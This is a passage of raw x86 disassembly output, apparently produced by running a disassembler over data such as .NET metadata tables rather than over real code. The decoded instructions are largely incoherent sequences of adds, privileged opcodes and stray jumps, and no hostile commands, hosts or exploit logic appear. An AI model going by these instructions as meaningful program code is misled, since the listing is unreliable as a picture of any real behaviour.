  405ce7:	00 cf                	add    %cl,%bh
  405ce9:	06                   	push   %es
  405cea:	3d 15 06 00 6e       	cmp    $0x6e000615,%eax
  405cef:	1d 55 00 16 00       	sbb    $0x160055,%eax
  405cf4:	ff 16                	call   *(%esi)
  405cf6:	dc 02                	faddl  (%edx)
  405cf8:	06                   	push   %es
  405cf9:	00 31                	add    %dh,(%ecx)
  405cfb:	0e                   	push   %cs
  405cfc:	55                   	push   %ebp
  405cfd:	00 06                	add    %al,(%esi)
  405cff:	00 6c 06 5c          	add    %ch,0x5c(%esi,%eax,1)
  405d03:	02 06                	add    (%esi),%al
  405d05:	00 70 0f             	add    %dh,0xf(%eax)
  405d08:	5c                   	pop    %esp
  405d09:	02 06                	add    (%esi),%al
  405d0b:	00 02                	add    %al,(%edx)
  405d0d:	05 5c 02 06 00       	add    $0x6025c,%eax
  405d12:	77 14                	ja     0x405d28
  405d14:	5c                   	pop    %esp
  405d15:	02 06                	add    (%esi),%al
  405d17:	00 26                	add    %ah,(%esi)
  405d19:	12 5c 02 16          	adc    0x16(%edx,%eax,1),%bl
  405d1d:	00 3f                	add    %bh,(%edi)
  405d1f:	12 5e 15             	adc    0x15(%esi),%bl
  405d22:	1a 00                	sbb    (%eax),%al
  405d24:	f6 13                	notb   (%ebx)
  405d26:	8b 1a                	mov    (%edx),%ebx
  405d28:	1a 00                	sbb    (%eax),%al
  405d2a:	7b 11                	jnp    0x405d3d
  405d2c:	8b 1a                	mov    (%edx),%ebx
  405d2e:	8b 01                	mov    (%ecx),%eax
  405d30:	af                   	scas   %es:(%edi),%eax
  405d31:	14 00                	adc    $0x0,%al
  405d33:	00 1a                	add    %bl,(%edx)
  405d35:	00 1b                	add    %bl,(%ebx)
  405d37:	19 8b 1a 06 00 36    	sbb    %ecx,0x3600061a(%ebx)
  405d3d:	15 ee 0f 06 00       	adc    $0x60fee,%eax
  405d42:	7a 00                	jp     0x405d44
  405d44:	ee                   	out    %al,(%dx)
  405d45:	0f 06                	clts
  405d47:	00 e5                	add    %ah,%ch
  405d49:	0f ee 0f             	pmaxsw (%edi),%mm1
  405d4c:	06                   	push   %es
  405d4d:	00 da                	add    %bl,%dl
  405d4f:	00 ee                	add    %ch,%dh
  405d51:	0f 06                	clts
  405d53:	00 de                	add    %bl,%dh
  405d55:	12 04 1d 06 00 2d 10 	adc    0x102d0006(,%ebx,1),%al
  405d5c:	04 1d                	add    $0x1d,%al
  405d5e:	06                   	push   %es
  405d5f:	00 a7 07 ee 0f 06    	add    %ah,0x60fee07(%edi)
  405d65:	00 80 10 ee 0f 1e    	add    %al,0x1e0fee10(%eax)
  405d6b:	00 24 11             	add    %ah,(%ecx,%edx,1)
  405d6e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405d6f:	17                   	pop    %ss
  405d70:	06                   	push   %es
  405d71:	00 a5 1d b8 0e 06    	add    %ah,0x60eb81d(%ebp)
  405d77:	00 d2                	add    %dl,%dl
  405d79:	0e                   	push   %cs
  405d7a:	b8 0e 06 00 7a       	mov    $0x7a00060e,%eax
  405d7f:	06                   	push   %es
  405d80:	b8 0e 06 00 6f       	mov    $0x6f00060e,%eax
  405d85:	03 ee                	add    %esi,%ebp
  405d87:	0f 06                	clts
  405d89:	00 1a                	add    %bl,(%edx)
  405d8b:	06                   	push   %es
  405d8c:	98                   	cwtl
  405d8d:	0b 0a                	or     (%edx),%ecx
  405d8f:	00 0f                	add    %cl,(%edi)
  405d91:	14 55                	adc    $0x55,%al
  405d93:	00 0a                	add    %cl,(%edx)
  405d95:	00 93 18 55 00 06    	add    %dl,0x6005518(%ebx)
  405d9b:	00 d0                	add    %dl,%al
  405d9d:	04 55                	add    $0x55,%al
  405d9f:	00 43 00             	add    %al,0x0(%ebx)
  405da2:	ec                   	in     (%dx),%al
  405da3:	14 00                	adc    $0x0,%al
  405da5:	00 12                	add    %dl,(%edx)
  405da7:	00 9d 05 ba 12 06    	add    %bl,0x612ba05(%ebp)
  405dad:	00 12                	add    %dl,(%edx)
  405daf:	00 c1                	add    %al,%cl
  405db1:	02 06                	add    (%esi),%al
  405db3:	00 b2 10 ee 0f 06    	add    %dh,0x60fee10(%edx)
  405db9:	00 21                	add    %ah,(%ecx)
  405dbb:	1d 4f 11 06 00       	sbb    $0x6114f,%eax
  405dc0:	33 08                	xor    (%eax),%ecx
  405dc2:	ee                   	out    %al,(%dx)
  405dc3:	0f 06                	clts
  405dc5:	00 f7                	add    %dh,%bh
  405dc7:	14 ee                	adc    $0xee,%al
  405dc9:	0f 06                	clts
  405dcb:	00 f6                	add    %dh,%dh
  405dcd:	05 ee 0f 22 00       	add    $0x220fee,%eax
  405dd2:	4c                   	dec    %esp
  405dd3:	12 55 13             	adc    0x13(%ebp),%dl
  405dd6:	22 00                	and    (%eax),%al
  405dd8:	cd 16                	int    $0x16
  405dda:	55                   	push   %ebp
  405ddb:	13 22                	adc    (%edx),%esp
  405ddd:	00 7c 13 55          	add    %bh,0x55(%ebx,%edx,1)
  405de1:	13 12                	adc    (%edx),%edx
  405de3:	00 74 13 9b          	add    %dh,-0x65(%ebx,%edx,1)
  405de7:	15 22 00 e5 16       	adc    $0x16e50022,%eax
  405dec:	55                   	push   %ebp
  405ded:	13 06                	adc    (%esi),%eax
  405def:	00 55 16             	add    %dl,0x16(%ebp)
  405df2:	04 1d                	add    $0x1d,%al
  405df4:	06                   	push   %es
  405df5:	00 eb                	add    %ch,%bl
  405df7:	11 ee                	adc    %ebp,%esi
  405df9:	0f 06                	clts
  405dfb:	00 5c 16 04          	add    %bl,0x4(%esi,%edx,1)
  405dff:	1d 12 00 10 13       	sbb    $0x13100012,%eax
  405e04:	04 1d                	add    $0x1d,%al
  405e06:	06                   	push   %es
  405e07:	00 a4 0f 04 1d 06 00 	add    %ah,0x61d04(%edi,%ecx,1)
  405e0e:	fb                   	sti
  405e0f:	00 04 1d 06 00 d5 11 	add    %al,0x11d50006(,%ebx,1)
  405e16:	ee                   	out    %al,(%dx)
  405e17:	0f 06                	clts
  405e19:	00 06                	add    %al,(%esi)
  405e1b:	10 04 1d 06 00 47 05 	adc    %al,0x5470006(,%ebx,1)
  405e22:	04 1d                	add    $0x1d,%al
  405e24:	06                   	push   %es
  405e25:	00 0b                	add    %cl,(%ebx)
  405e27:	05 04 1d 06 00       	add    $0x61d04,%eax
  405e2c:	47                   	inc    %edi
  405e2d:	10 04 1d 06 00 26 05 	adc    %al,0x5260006(,%ebx,1)
  405e34:	04 1d                	add    $0x1d,%al
  405e36:	06                   	push   %es
  405e37:	00 be 11 04 1d 06    	add    %bh,0x61d0411(%esi)
  405e3d:	00 9d 13 ee 0f 06    	add    %bl,0x60fee13(%ebp)
  405e43:	00 97 1c ee 0f 06    	add    %dl,0x60fee1c(%edi)
  405e49:	00 ff                	add    %bh,%bh
  405e4b:	17                   	pop    %ss
  405e4c:	9b                   	fwait
  405e4d:	15 06 00 d3 05       	adc    $0x5d30006,%eax
  405e52:	ee                   	out    %al,(%dx)
  405e53:	0f 06                	clts
  405e55:	00 26                	add    %ah,(%esi)
  405e57:	03 04 1d 06 00 c7 00 	add    0xc70006(,%ebx,1),%eax
  405e5e:	ee                   	out    %al,(%dx)
  405e5f:	0f 06                	clts
  405e61:	00 c1                	add    %al,%cl
  405e63:	05 ee 0f 06 00       	add    $0x60fee,%eax
  405e68:	3f                   	aas
  405e69:	06                   	push   %es
  405e6a:	ee                   	out    %al,(%dx)
  405e6b:	0f 06                	clts
  405e6d:	00 2e                	add    %ch,(%esi)
  405e6f:	18 5c 02 06          	sbb    %bl,0x6(%edx,%eax,1)
  405e73:	00 38                	add    %bh,(%eax)
  405e75:	08 5c 02 0a          	or     %bl,0xa(%edx,%eax,1)
  405e79:	00 b1 0f 0e 11 0a    	add    %dh,0xa110e0f(%ecx)
  405e7f:	00 37                	add    %dh,(%edi)
  405e81:	05 0e 11 00 00       	add    $0x110e,%eax
  405e86:	00 00                	add    %al,(%eax)
  405e88:	40                   	inc    %eax
  405e89:	01 00                	add    %eax,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 c9                	add    %cl,%cl
  405e97:	0f 84 1a 05 00 01    	je     0x14063b7
  405e9d:	00 01                	add    %al,(%ecx)
  405e9f:	00 81 01 10 00 11    	add    %al,0x11001001(%ecx)
  405ea5:	17                   	pop    %ss
  405ea6:	84 1a                	test   %bl,(%edx)
  405ea8:	05 00 01 00 03       	add    $0x3000100,%eax
  405ead:	00 81 01 10 00 99    	add    %al,-0x66ffefff(%ecx)
  405eb3:	19 96 11 05 00 13    	sbb    %edx,0x13000511(%esi)
  405eb9:	00 06                	add    %al,(%esi)
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 ac 12 06 0f 05 00 	add    %ch,0x50f06(%edx,%edx,1)
  405ec6:	1e                   	push   %ds
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	31 17                	xor    %edx,(%edi)
  405ed0:	35 14 05 00 1e       	xor    $0x1e000514,%eax
  405ed5:	00 26                	add    %ah,(%esi)
  405ed7:	00 81 01 10 00 88    	add    %al,-0x77ffefff(%ecx)
  405edd:	10 35 14 05 00 1e    	adc    %dh,0x1e000514
  405ee3:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ee9:	00 45 13             	add    %al,0x13(%ebp)
  405eec:	35 14 05 00 1e       	xor    $0x1e000514,%eax
  405ef1:	00 2f                	add    %ch,(%edi)
  405ef3:	00 81 01 10 00 56    	add    %al,0x56001001(%ecx)
  405ef9:	15 35 14 05 00       	adc    $0x51435,%eax
  405efe:	1e                   	push   %ds
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 55    	add    %al,0x55001001(%ecx)
  405f07:	0f 35                	sysexit
  405f09:	14 05                	adc    $0x5,%al
  405f0b:	00 1e                	add    %bl,(%esi)
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 50    	add    %al,0x50001001(%ecx)
  405f15:	15 35 14 05 00       	adc    $0x51435,%eax
  405f1a:	1f                   	pop    %ds
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 01                	add    %al,(%ecx)
  405f23:	02 00                	add    (%eax),%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 96    	add    %al,-0x69ffefff(%ecx)
  405f31:	0e                   	push   %cs
  405f32:	35 14 05 00 23       	xor    $0x23000514,%eax
  405f37:	00 3e                	add    %bh,(%esi)
  405f39:	00 81 01 10 00 6b    	add    %al,0x6b001001(%ecx)
  405f3f:	1d 35 14 05 00       	sbb    $0x51435,%eax
  405f44:	23 00                	and    (%eax),%eax
  405f46:	41                   	inc    %ecx
  405f47:	00 81 01 10 00 92    	add    %al,-0x6dffefff(%ecx)
  405f4d:	19 74 19 05          	sbb    %esi,0x5(%ecx,%ebx,1)
  405f51:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f54:	46                   	inc    %esi
  405f55:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
  405f5b:	00 00                	add    %al,(%eax)
  405f5d:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 0d 01 f5 0f 05    	add    %cl,0x50ff501
  405f6d:	00 26                	add    %ah,(%esi)
  405f6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405f72:	81 01 10 00 06 01    	addl   $0x1060010,(%ecx)
  405f78:	f5                   	cmc
  405f79:	0f 05                	syscall
  405f7b:	00 2d 00 52 00 00    	add    %ch,0x5200
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 58 01             	add    %bl,0x1(%eax)
  405f86:	00 00                	add    %al,(%eax)
  405f88:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f8d:	00 15 01 00 00 38    	add    %dl,0x38000001
  405f93:	00 00                	add    %al,(%eax)
  405f95:	00 51 00             	add    %dl,0x0(%ecx)
  405f98:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 9b 17 bf 0d 05    	add    %bl,0x50dbf17(%ebx)
  405fa5:	00 2e                	add    %ch,(%esi)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 58 10             	add    %bl,0x10(%eax)
  405fb0:	bf 0d 05 00 2f       	mov    $0x2f00050d,%edi
  405fb5:	00 5f 00             	add    %bl,0x0(%edi)
  405fb8:	01 00                	add    %eax,(%eax)
  405fba:	10 00                	adc    %al,(%eax)
  405fbc:	71 1c                	jno    0x405fda
  405fbe:	bf 0d 05 00 31       	mov    $0x3100050d,%edi
  405fc3:	00 63 00             	add    %ah,0x0(%ebx)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	da 0d bf 0d 05 00    	fimull 0x50dbf
  405fd0:	33 00                	xor    (%eax),%eax
  405fd2:	6a 00                	push   $0x0
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	0c 08                	or     $0x8,%al
  405fda:	bf 0d 39 00 3a       	mov    $0x3a00390d,%edi
  405fdf:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fe5:	00 86 17 bf 0d 05    	add    %al,0x50dbf17(%esi)
  405feb:	00 47 00             	add    %al,0x0(%edi)
  405fee:	95                   	xchg   %eax,%ebp
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 90 17 bf 0d 05    	add    %dl,0x50dbf17(%eax)
  405ff9:	00 47 00             	add    %al,0x0(%edi)
  405ffc:	99                   	cltd
  405ffd:	00 81 01 10 00 86    	add    %al,-0x79ffefff(%ecx)
  406003:	12 bf 0d 05 00 47    	adc    0x4700050d(%edi),%bh
  406009:	00 a2 00 00 01 00    	add    %ah,0x10000(%edx)
  40600f:	00 49 01             	add    %cl,0x1(%ecx)
  406012:	00 00                	add    %al,(%eax)
  406014:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406019:	00 15 01 00 00 1b    	add    %dl,0x1b000001
  40601f:	01 00                	add    %eax,(%eax)
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 a0 18 	add    %ah,0x18a00016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 ad 18 12 00 16    	add    %ch,0x16001218(%ebp)
  406035:	00 06                	add    %al,(%esi)
  406037:	11 12                	adc    %edx,(%edx)
  406039:	00 16                	add    %dl,(%esi)
  40603b:	00 0d 0f 12 00 16    	add    %cl,0x1600120f
  406041:	00 37                	add    %dh,(%edi)
  406043:	13 12                	adc    (%edx),%edx
  406045:	00 16                	add    %dl,(%esi)
  406047:	00 46 06             	add    %al,0x6(%esi)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 fb                	add    %bh,%bl
  40604f:	1c 12                	sbb    $0x12,%al
  406051:	00 16                	add    %dl,(%esi)
  406053:	00 97 02 12 00 16    	add    %dl,0x16001202(%edi)
  406059:	00 9b 08 12 00 16    	add    %bl,0x16001208(%ebx)
  40605f:	00 4e 08             	add    %cl,0x8(%esi)
  406062:	12 00                	adc    (%eax),%al
  406064:	16                   	push   %ss
  406065:	00 95 08 15 00 16    	add    %dl,0x16001508(%ebp)
  40606b:	00 a3 0d 12 00 16    	add    %ah,0x1600120d(%ebx)
  406071:	00 14 01             	add    %dl,(%ecx,%eax,1)
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 ce                	add    %cl,%dh
  406079:	10 12                	adc    %dl,(%edx)
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 6b 02             	add    %ch,0x2(%ebx)
  406080:	12 00                	adc    (%eax),%al
  406082:	16                   	push   %ss
  406083:	00 74 03 12          	add    %dh,0x12(%ebx,%eax,1)
  406087:	00 16                	add    %dl,(%esi)
  406089:	00 50 1c             	add    %dl,0x1c(%eax)
  40608c:	12 00                	adc    (%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 a6 12 12 00 11    	add    %ah,0x11001212(%esi)
  406095:	00 80 04 21 00 11    	add    %al,0x11002104(%eax)
  40609b:	00 65 04             	add    %ah,0x4(%ebp)
  40609e:	25 00 11 00 35       	and    $0x35001100,%eax
  4060a3:	04 29                	add    $0x29,%al
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 cb                	add    %cl,%bl
  4060a9:	03 2d 00 11 00 4d    	add    0x4d001100,%ebp
  4060af:	04 2d                	add    $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 b0 03 30 00 11    	add    %dh,0x11003003(%eax)
  4060b9:	00 93 03 34 00 31    	add    %dl,0x31003403(%ebx)
  4060bf:	00 79 03             	add    %bh,0x3(%ecx)
  4060c2:	37                   	aaa
  4060c3:	00 11                	add    %dl,(%ecx)
  4060c5:	00 e7                	add    %ah,%bh
  4060c7:	03 30                	add    (%eax),%esi
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 1b                	add    %bl,(%ebx)
  4060cd:	04 3a                	add    $0x3a,%al
  4060cf:	00 11                	add    %dl,(%ecx)
  4060d1:	00 fd                	add    %bh,%ch
  4060d3:	03 34 00             	add    (%eax,%eax,1),%esi
  4060d6:	16                   	push   %ss
  4060d7:	00 8a 12 dc 00 06    	add    %cl,0x600dc12(%edx)
  4060dd:	06                   	push   %es
  4060de:	9b                   	fwait
  4060df:	02 06                	add    (%esi),%al
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	70 02                	jo     0x4060e8
  4060e6:	09 01                	or     %eax,(%ecx)
  4060e8:	56                   	push   %esi
  4060e9:	80 ce 01             	or     $0x1,%dh
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 bb 01 09 01 31 00 	cmpb   $0x0,0x31010901(%ebx)
  4060f6:	fe 01                	incb   (%ecx)
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	16                   	push   %ss
  4060fb:	00 4f 17             	add    %cl,0x17(%edi)
  4060fe:	30 01                	xor    %al,(%ecx)
  406100:	16                   	push   %ss
  406101:	00 0b                	add    %cl,(%ebx)
  406103:	00 43 01             	add    %al,0x1(%ebx)
  406106:	51                   	push   %ecx
  406107:	80 95 0d 3a 00 51 80 	adcb   $0x80,0x51003a0d(%ebp)
  40610e:	91                   	xchg   %eax,%ecx
  40610f:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  406114:	88 0d 3a 00 51 80    	mov    %cl,0x8051003a
  40611a:	6c                   	insb   (%dx),%es:(%edi)
  40611b:	0d 3a 00 21 00       	or     $0x21003a,%eax
  406120:	ff 1c 29             	lcall  *(%ecx,%ebp,1)
  406123:	00 21                	add    %ah,(%ecx)
  406125:	00 e0                	add    %ah,%al
  406127:	1c 29                	sbb    $0x29,%al
  406129:	00 31                	add    %dh,(%ecx)
  40612b:	00 f4                	add    %dh,%ah
  40612d:	19 29                	sbb    %ebp,(%ecx)
  40612f:	00 33                	add    %dh,(%ebx)
  406131:	01 77 01             	add    %esi,0x1(%edi)
  406134:	8b 01                	mov    (%ecx),%eax
  406136:	11 00                	adc    %eax,(%eax)
  406138:	5d                   	pop    %ebp
  406139:	05 8f 01 01 00       	add    $0x1018f,%eax
  40613e:	94                   	xchg   %eax,%esp
  40613f:	10 30                	adc    %dh,(%eax)
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 b5 11 3a 00 01    	add    %dh,0x1003a11(%ebp)
  406149:	00 94 10 30 01 01 00 	add    %dl,0x10130(%eax,%edx,1)
  406150:	2f                   	das
  406151:	14 c7                	adc    $0xc7,%al
  406153:	01 01                	add    %eax,(%ecx)
  406155:	00 a2 07 12 00 01    	add    %ah,0x1001207(%edx)
  40615b:	00 82 07 12 00 01    	add    %al,0x1001207(%edx)
  406161:	00 a4 0a 37 00 01 00 	add    %ah,0x10037(%edx,%ecx,1)
  406168:	02 08                	add    (%eax),%cl
  40616a:	02 02                	add    (%edx),%al
  40616c:	01 00                	add    %eax,(%eax)
  40616e:	a9 1a c7 01 01       	test   $0x101c71a,%eax
  406173:	00 94 10 30 01 01 00 	add    %dl,0x10130(%eax,%edx,1)
  40617a:	92                   	xchg   %eax,%edx
  40617b:	1c 06                	sbb    $0x6,%al
  40617d:	02 06                	add    (%esi),%al
  40617f:	06                   	push   %es
  406180:	9b                   	fwait
  406181:	02 3a                	add    (%edx),%bh
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	fd                   	std
  406187:	11 02                	adc    %eax,(%edx)
  406189:	02 56 80             	add    -0x80(%esi),%dl
  40618c:	50                   	push   %eax
  40618d:	0f 02 02             	lar    (%edx),%eax
  406190:	56                   	push   %esi
  406191:	80 75 12 02          	xorb   $0x2,0x12(%ebp)
  406195:	02 56 80             	add    -0x80(%esi),%dl
  406198:	97                   	xchg   %eax,%edi
  406199:	1c 02                	sbb    $0x2,%al
  40619b:	02 56 80             	add    -0x80(%esi),%dl
  40619e:	c3                   	ret
  40619f:	0c 02                	or     $0x2,%al
  4061a1:	02 56 80             	add    -0x80(%esi),%dl
  4061a4:	df 13                	fists  (%ebx)
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 c7 00             	add    $0x0,%bh
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 80 10 02 02 56 80 	addb   $0x80,0x56020210(%eax)
  4061b6:	0a 19                	or     (%ecx),%bl
  4061b8:	02 02                	add    (%edx),%al
  4061ba:	56                   	push   %esi
  4061bb:	80 3f 06             	cmpb   $0x6,(%edi)
  4061be:	02 02                	add    (%edx),%al
  4061c0:	56                   	push   %esi
  4061c1:	80 a7 07 02 02 56 80 	andb   $0x80,0x56020207(%edi)
  4061c8:	50                   	push   %eax
  4061c9:	1d 02 02 33 01       	sbb    $0x1330202,%eax
  4061ce:	11 02                	adc    %eax,(%edx)
  4061d0:	fd                   	std
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 9d 10 0a 00 01    	add    %bl,0x1000a10(%ebp)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	01 15 0e 00 01 00    	add    %edx,0x1000e
  4061ee:	f8                   	clc
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 07                	add    %al,(%edi)
  4061f7:	17                   	pop    %ss
  4061f8:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 37 0d 1d    	add    %dl,0x1d0d3700(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 07 15 0a    	add    %dl,0xa150718(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 5a 1a 3d    	add    %dl,0x3d1a5a08(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 68 1a 42    	add    %dl,0x421a6808(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 3e 1a 48    	add    %dl,0x481a3e08(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 4c 1a 4d    	add    %dl,0x4d1a4c08(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 8e 13 53    	add    %dl,0x53138e08(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 99 13 58    	add    %dl,0x58139908(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 16 0b 5e    	add    %dl,0x5e0b1608(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 25 0b 62 00 04    	or     %ah,0x400620b
  406287:	00 bc 20 00 00 00 00 	add    %bh,0x0(%eax,%eiz,1)
  40628e:	91                   	xchg   %eax,%ecx
  40628f:	08 cb                	or     %cl,%bl
  406291:	19 5e 00             	sbb    %ebx,0x0(%esi)
  406294:	05 00 c3 20 00       	add    $0x20c300,%eax
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 d6 19 62    	add    %dl,0x6219d608(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 c7 0a 67    	add    %dl,0x670ac708(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 d5 0a 6c    	add    %dl,0x6c0ad508(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 42 03 1d    	add    %dl,0x1d034208(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 52 03 72    	add    %dl,0x72035208(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 f2 02 77    	add    %dl,0x7702f208(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 86 0b 67    	add    %dl,0x670b8608(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 8f 0b 6c    	add    %dl,0x6c0b8f08(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 ec 0e 7b    	add    %dl,0x7b0eec08(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 f9 0e 7f    	add    %dl,0x7f0ef908(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 e3 0c 1d    	add    %dl,0x1d0ce308(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 f4 0c 72    	add    %dl,0x720cf408(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 2d 1a 0a    	add    %dl,0xa1a2d00(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 63 07 84    	add    %dl,-0x7bf89d00(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 8d 08 89    	add    %dl,-0x76f77300(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 50 19 0a    	add    %dl,0xa195000(%esi)
